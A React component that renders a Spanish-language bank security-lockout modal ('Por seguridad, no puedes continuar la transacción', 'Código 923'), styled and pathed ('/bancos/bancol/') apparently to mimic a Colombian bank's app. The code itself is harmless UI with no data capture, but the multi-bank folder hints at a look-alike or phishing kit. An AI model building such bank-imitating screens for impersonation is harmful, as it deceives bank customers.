"use client";

import Image from "next/image";
import React from "react";

interface XBloqueoModalProps {
  onAceptar: () => void;
}

export default function XBloqueoModal({ onAceptar }: XBloqueoModalProps) {
  return (
    <div className="fixed inset-0 bg-black/60 z-9999 flex items-center justify-center p-4 backdrop-blur-[1.5px] animate-in fade-in duration-200">
      
      {/* Modal Card */}
      <div 
        style={{
          backgroundColor: 'white',
          borderRadius: '24px',
          padding: '32px 24px 28px 24px',
          width: '100%',
          maxWidth: '310px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          textAlign: 'center',
          boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)',
          boxSizing: 'border-box'
        }}
      >
        
        {/* Lockout Icon Image */}
        <div style={{ marginBottom: '16px', display: 'flex', justifyContent: 'center' }}>
          <Image
            src="/bancos/bancol/bloqueos.svg"
            alt="Bloqueo de seguridad"
            width={60}
            height={60}
            style={{ display: 'block' }}
          />
        </div>

        {/* Title */}
        <h3 
          style={{
            fontSize: '14px',
            color: '#2c2a29',
            fontWeight: 'bold',
            margin: '0 0 12px 0',
            lineHeight: '1.4',
            padding: '0 8px'
          }}
        >
          Por seguridad, no puedes continuar la transacción
        </h3>

        {/* Description */}
        <p 
          style={{
            fontSize: '12px',
            color: '#555',
            lineHeight: '1.5',
            fontWeight: 'normal',
            margin: '0 0 12px 0',
            padding: '0 8px',
            userSelect: 'none'
          }}
        >
          Para mas información, comunícate con la Sucursal Telefónica.
        </p>

        {/* Code Text */}
        <p 
          style={{
            fontSize: '13px',
            color: '#2c2a29',
            fontWeight: '500',
            margin: '0 0 24px 0',
            userSelect: 'none'
          }}
        >
          Código 923
        </p>

        {/* Yellow "ACEPTAR" button - stylized uppercase capsule */}
        <button
          type="button"
          onClick={onAceptar}
          style={{
            width: '210px',
            height: '36px',
            backgroundColor: '#FDDF3C',
            borderRadius: '18px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontWeight: '600',
            color: '#2c2a29',
            fontSize: '12.5px',
            textTransform: 'uppercase',
            border: 'none',
            cursor: 'pointer',
            outline: 'none',
            boxSizing: 'border-box'
          }}
        >
          ACEPTAR
        </button>

      </div>

    </div>
  );
}
